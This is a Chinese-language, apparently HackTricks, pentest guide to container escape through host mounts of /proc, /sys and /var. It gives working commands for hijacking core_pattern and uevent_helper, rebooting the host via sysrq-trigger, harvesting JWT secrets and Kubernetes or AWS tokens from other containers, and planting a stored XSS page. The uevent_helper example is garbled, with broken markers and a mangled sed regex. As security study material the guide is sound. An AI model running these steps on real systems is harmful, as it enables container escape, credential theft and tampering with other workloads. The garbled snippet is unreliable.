# 敏感挂载

{{#include ../../../../banners/hacktricks-training.md}}

暴露 `/proc`、`/sys` 和 `/var` 而没有适当的命名空间隔离会引入重大安全风险，包括攻击面扩大和信息泄露。这些目录包含敏感文件，如果配置错误或被未经授权的用户访问，可能导致容器逃逸、主机修改或提供有助于进一步攻击的信息。例如，错误地挂载 `-v /proc:/host/proc` 可能会由于其基于路径的特性绕过 AppArmor 保护，使得 `/host/proc` 没有保护。

**您可以在** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)** 中找到每个潜在漏洞的更多详细信息。**

## procfs 漏洞

### `/proc/sys`

该目录允许访问以修改内核变量，通常通过 `sysctl(2)`，并包含几个关注的子目录：

#### **`/proc/sys/kernel/core_pattern`**

- 在 [core(5)](https://man7.org/linux/man-pages/man5/core.5.html) 中描述。
- 允许定义在核心文件生成时执行的程序，前 128 字节作为参数。如果文件以管道 `|` 开头，可能导致代码执行。
- **测试和利用示例**：

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # 测试写入访问
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # 设置自定义处理程序
sleep 5 && ./crash & # 触发处理程序
```

#### **`/proc/sys/kernel/modprobe`**

- 在 [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) 中详细说明。
- 包含内核模块加载器的路径，用于加载内核模块。
- **检查访问示例**：

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # 检查对 modprobe 的访问
```

#### **`/proc/sys/vm/panic_on_oom`**

- 在 [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) 中引用。
- 一个全局标志，控制内核在发生 OOM 条件时是否崩溃或调用 OOM 杀手。

#### **`/proc/sys/fs`**

- 根据 [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)，包含有关文件系统的选项和信息。
- 写入访问可能会启用对主机的各种拒绝服务攻击。

#### **`/proc/sys/fs/binfmt_misc`**

- 允许根据其魔数注册非本地二进制格式的解释器。
- 如果 `/proc/sys/fs/binfmt_misc/register` 可写，可能导致特权升级或 root shell 访问。
- 相关利用和解释：
- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
- 深入教程：[视频链接](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### `/proc` 中的其他内容

#### **`/proc/config.gz`**

- 如果启用了 `CONFIG_IKCONFIG_PROC`，可能会泄露内核配置。
- 对攻击者识别运行内核中的漏洞非常有用。

#### **`/proc/sysrq-trigger`**

- 允许调用 Sysrq 命令，可能导致立即重启系统或其他关键操作。
- **重启主机示例**：

```bash
echo b > /proc/sysrq-trigger # 重启主机
```

#### **`/proc/kmsg`**

- 暴露内核环形缓冲区消息。
- 可以帮助内核利用、地址泄露，并提供敏感系统信息。

#### **`/proc/kallsyms`**

- 列出内核导出的符号及其地址。
- 对于内核利用开发至关重要，尤其是在克服 KASLR 时。
- 地址信息在 `kptr_restrict` 设置为 `1` 或 `2` 时受到限制。
- 详细信息见 [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)。

#### **`/proc/[pid]/mem`**

- 与内核内存设备 `/dev/mem` 交互。
- 历史上容易受到特权升级攻击。
- 更多信息见 [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)。

#### **`/proc/kcore`**

- 以 ELF 核心格式表示系统的物理内存。
- 读取可能泄露主机系统和其他容器的内存内容。
- 大文件大小可能导致读取问题或软件崩溃。
- 详细用法见 [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/)。

#### **`/proc/kmem`**

- `/dev/kmem` 的替代接口，表示内核虚拟内存。
- 允许读取和写入，因此可以直接修改内核内存。

#### **`/proc/mem`**

- `/dev/mem` 的替代接口，表示物理内存。
- 允许读取和写入，修改所有内存需要解析虚拟地址到物理地址。

#### **`/proc/sched_debug`**

- 返回进程调度信息，绕过 PID 命名空间保护。
- 暴露进程名称、ID 和 cgroup 标识符。

#### **`/proc/[pid]/mountinfo`**

- 提供有关进程挂载命名空间中挂载点的信息。
- 暴露容器 `rootfs` 或映像的位置。

### `/sys` 漏洞

#### **`/sys/kernel/uevent_helper`**

- 用于处理内核设备 `uevents`。
- 写入 `/sys/kernel/uevent_helper` 可以在 `uevent` 触发时执行任意脚本。
- **利用示例**： %%%bash

#### 创建有效负载

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### 从 OverlayFS 挂载中查找主机路径

host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)

#### 将 uevent_helper 设置为恶意助手

echo "$host_path/evil-helper" > /sys/kernel/uevent_helper

#### 触发 uevent

echo change > /sys/class/mem/null/uevent

#### 读取输出

cat /output %%%

#### **`/sys/class/thermal`**

- 控制温度设置，可能导致 DoS 攻击或物理损坏。

#### **`/sys/kernel/vmcoreinfo`**

- 泄露内核地址，可能危及 KASLR。

#### **`/sys/kernel/security`**

- 存放 `securityfs` 接口，允许配置 Linux 安全模块，如 AppArmor。
- 访问可能使容器能够禁用其 MAC 系统。

#### **`/sys/firmware/efi/vars` 和 `/sys/firmware/efi/efivars`**

- 暴露与 NVRAM 中 EFI 变量交互的接口。
- 配置错误或利用可能导致笔记本电脑砖化或主机无法启动。

#### **`/sys/kernel/debug`**

- `debugfs` 提供了一个“无规则”的内核调试接口。
- 由于其不受限制的特性，历史上存在安全问题。

### `/var` 漏洞

主机的 **/var** 文件夹包含容器运行时套接字和容器的文件系统。如果该文件夹在容器内挂载，该容器将获得对其他容器文件系统的读写访问权限，具有 root 权限。这可能被滥用以在容器之间进行跳转，导致拒绝服务，或为在其中运行的其他容器和应用程序后门。

#### Kubernetes

如果像这样的容器通过 Kubernetes 部署：
```yaml
apiVersion: v1
kind: Pod
metadata:
name: pod-mounts-var
labels:
app: pentest
spec:
containers:
- name: pod-mounts-var-folder
image: alpine
volumeMounts:
- mountPath: /host-var
name: noderoot
command: [ "/bin/sh", "-c", "--" ]
args: [ "while true; do sleep 30; done;" ]
volumes:
- name: noderoot
hostPath:
path: /var
```
在 **pod-mounts-var-folder** 容器内：
```bash
/ # find /host-var/ -type f -iname '*.env*' 2>/dev/null

/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/201/fs/usr/src/app/.env.example
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs/docker-entrypoint.d/15-local-resolvers.envsh

/ # cat /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/105/fs/usr/src/app/.env.example | grep -i secret
JWT_SECRET=85d<SNIP>a0
REFRESH_TOKEN_SECRET=14<SNIP>ea

/ # find /host-var/ -type f -iname 'index.html' 2>/dev/null
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs/usr/src/app/node_modules/@mapbox/node-pre-gyp/lib/util/nw-pre-gyp/index.html
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html

/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
are/nginx/html/index2.html
```
XSS 是通过以下方式实现的：

![通过挂载的 /var 文件夹存储的 XSS](/images/stored-xss-via-mounted-var-folder.png)

请注意，容器不需要重启或其他操作。通过挂载的 **/var** 文件夹所做的任何更改将立即生效。

您还可以替换配置文件、二进制文件、服务、应用程序文件和 shell 配置文件，以实现自动（或半自动）RCE。

##### 访问云凭证

容器可以读取 K8s serviceaccount 令牌或 AWS webidentity 令牌，这使得容器能够获得对 K8s 或云的未经授权访问：
```bash
/ # cat /host-var/run/secrets/kubernetes.io/serviceaccount/token
/ # cat /host-var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
#### Docker

在Docker（或Docker Compose部署）中的利用方式完全相同，唯一的区别是其他容器的文件系统通常在不同的基础路径下可用：
```bash
$ docker info | grep -i 'docker root\|storage driver'
Storage Driver: overlay2
Docker Root Dir: /var/lib/docker
```
所以文件系统位于 `/var/lib/docker/overlay2/`：
```bash
$ sudo ls -la /var/lib/docker/overlay2

drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d
drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496
drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f
drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
<SNIP>
```
#### 注意

实际路径在不同的设置中可能会有所不同，这就是为什么你最好的选择是使用 **find** 命令来定位其他容器的文件系统



### 参考文献

- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)

{{#include ../../../../banners/hacktricks-training.md}}
